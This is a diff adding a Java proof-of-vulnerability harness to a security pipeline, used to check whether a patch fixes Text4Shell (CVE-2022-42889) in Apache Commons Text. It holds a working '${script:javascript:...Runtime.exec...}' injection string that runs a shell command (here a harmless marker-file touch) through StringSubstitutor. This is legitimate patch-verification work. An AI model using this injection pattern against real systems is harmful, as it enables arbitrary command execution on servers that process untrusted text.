@@ -1,0 +1,74 @@
+diff --git a/.security-pipeline/pov/Text4ShellPov.java b/.security-pipeline/pov/Text4ShellPov.java
+new file mode 100644
+index 0000000..4257e2a
+--- /dev/null
++++ b/.security-pipeline/pov/Text4ShellPov.java
+@@ -0,0 +1,68 @@
++/*
++ * Proof-of-Vulnerability for CWE-094 (Text4Shell / CVE-2022-42889).
++ *
++ * Root cause: StringSubstitutor.createInterpolator() builds a StringSubstitutor
++ * backed by StringLookupFactory.InterpolatorStringLookup.INSTANCE, which
++ * registers the "script" (and "dns", "url") lookups by default
++ * (StringLookupFactory.addDefaultStringLookups()). When a caller runs
++ * StringSubstitutor.replace(...) over a string that contains attacker-controlled
++ * text (e.g. a log message, HTTP header, config value, template), the
++ * "${script:...}" interpolation syntax is resolved without any opt-in, and
++ * ultimately reaches:
++ *
++ *   ScriptStringLookup.lookup(String key)   [src/main/java/org/apache/commons/text/lookup/ScriptStringLookup.java:69]
++ *     -> scriptEngine.eval(script)          [ScriptStringLookup.java:86]
++ *
++ * eval() runs arbitrary script code chosen entirely by the attacker-controlled
++ * input string, including full Java interop (java.lang.Runtime.exec, file I/O,
++ * reflection, etc). This PoV demonstrates the crossing of the trust boundary
++ * (untrusted template text -> live ScriptEngine.eval()) by having the injected
++ * script spawn an OS process that creates a marker file. If StringSubstitutor
++ * merely did textual substitution, no such side effect could occur.
++ *
++ * This program is NOT part of the product source or its test suite; it is only
++ * a standalone verification harness invoked directly by the security pipeline.
++ */
++
++import java.io.File;
++import java.nio.file.Files;
++
++import org.apache.commons.text.StringSubstitutor;
++
++public class Text4ShellPov {
++
++    public static void main(final String[] args) throws Exception {
++        final File markerFile = new File("/tmp/text4shell_pov_marker.txt");
++        Files.deleteIfExists(markerFile.toPath());
++
++        // Simulates untrusted input reaching StringSubstitutor.replace(...), e.g. a
++        // log message, HTTP header, or templated config value under attacker control.
++        final String attackerControlledInput =
++            "user-supplied: ${script:javascript:"
++            + "java.lang.Runtime.getRuntime().exec("
++            + "['/bin/sh','-c','touch " + markerFile.getAbsolutePath() + "']"
++            + ").waitFor()}";
++
++        // This mirrors the alert's sink call chain: StringSubstitutor(source) ->
++        // substitute(...) -> resolveVariable(varName) -> InterpolatorStringLookup ->
++        // ScriptStringLookup.lookup(key) -> scriptEngine.eval(script).
++        final String result = StringSubstitutor.createInterpolator().replace(attackerControlledInput);
++
++        // Give the spawned process a brief grace period in case waitFor() semantics
++        // differ across script engines/OS shells.
++        for (int i = 0; i < 50 && !markerFile.exists(); i++) {
++            Thread.sleep(100);
++        }
++
++        if (markerFile.exists()) {
++            System.out.println("VULNERABLE: ScriptStringLookup executed attacker-controlled OS command.");
++            System.out.println("StringSubstitutor.replace(...) result: " + result);
++            Files.deleteIfExists(markerFile.toPath());
++            System.exit(0); // PoV reproduced the vulnerability.
++        } else {
++            System.out.println("NOT VULNERABLE: injected script did not execute (marker file absent).");
++            System.out.println("StringSubstitutor.replace(...) result: " + result);
++            System.exit(1); // Behavior blocked - expected after a correct patch.
++        }
++    }
++}
